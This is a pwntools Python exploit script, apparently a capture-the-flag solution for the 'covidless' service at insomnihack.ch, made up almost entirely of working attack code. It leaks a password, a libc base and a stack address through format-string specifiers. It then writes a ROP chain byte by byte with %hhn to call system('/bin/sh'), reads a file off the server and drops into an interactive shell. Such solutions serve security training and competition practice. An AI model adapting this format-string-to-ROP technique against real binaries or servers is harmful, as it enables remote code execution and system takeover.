#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host covidless.insomnihack.ch --port 6666
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './path/to/binary'
libc = ELF('libc6_2.27-3ubuntu1_amd64.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'covidless.insomnihack.ch'
port = int(args.PORT or 6666)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

payload = b""

for i in range(6, 11):
    payload += "%{}$p ".format(i).encode()

io.sendline(payload)

io.recvuntil(b"Your covid pass is invalid : ")

password = ""

for i in range(0, 5):
    leak = int(io.recvuntil(b" ", drop=True), 0)

    while leak > 0:
        password += chr(leak % 0x100)
        leak //= 0x100;

io.success("Password: {}".format(password))

io.sendlineafter(b"try again ..\n\n", b"%31$p")

io.recvuntil(b"Your covid pass is invalid : ")
leak = int(io.recvuntil(b"\n", drop=True), 0)
libc.address = leak - libc.libc_start_main_return

io.success("Libc: {}".format(hex(libc.address)))

io.sendlineafter(b"try again ..\n\n", b"%33$p")

io.recvuntil(b"Your covid pass is invalid : ")
leak = int(io.recvuntil(b"\n", drop=True), 0)
stack = leak

diff = 0

while True:
    addr = stack + diff
    payload = flat({
        0x0: b'%20$p<<< BEGIN >>>%20$s<<< END >>>',
        0x40: p64(addr),
    })

    io.sendlineafter(b"try again ..\n\n", payload)
    io.recvuntil(b"Your covid pass is invalid : ")
    io.info("trying " + io.recvuntil(b"<<< BEGIN >>>", drop=True).decode())
    leak = io.recvuntil(b"<<< END >>>", drop=True)
    if len(leak) > 0 and leak in p64(addr):
        io.info("Stack offset: {}".format(diff))
        break
    diff -= 0x8

stack = stack + diff - (14 * 0x8)
io.success("Stack: {}".format(hex(stack)))

def writeByteAtAddr(byte, addr):
    io.info("writing " + hex(byte) + " to " + hex(addr))
    fmt = ""

    if byte > 0:
        fmt += "%{}c".format(byte % 0x100)

    fmt += "%20$hhn"

    payload = flat({
        0x0: fmt.encode(),
        0x40: p64(addr),
    })
    io.sendlineafter(b"try again ..\n\n", payload)

def writeQwordAtOffset(qword, offset):
    base_addr = stack + offset * 8

    for i in range(0, 8):
        addr = base_addr + i
        byte = (qword >> (i * 8)) % 0x100
        writeByteAtAddr(byte, addr)

rop = ROP(libc)

writeQwordAtOffset(rop.find_gadget(["ret"])[0], 25)
writeQwordAtOffset(rop.find_gadget(["pop rdi", "ret"])[0], 26)
writeQwordAtOffset(next(libc.search(b"/bin/sh")), 27)
writeQwordAtOffset(libc.sym["system"], 28)

io.sendlineafter(b"try again ..\n\n", password.encode())

io.sendline(b"cat covidless")
io.sendline(b"echo '<<< END >>>'")

f = open("vuln", "wb")
f.write(io.recvuntil(b"<<< END >>>", drop=True))
f.close()

io.interactive()

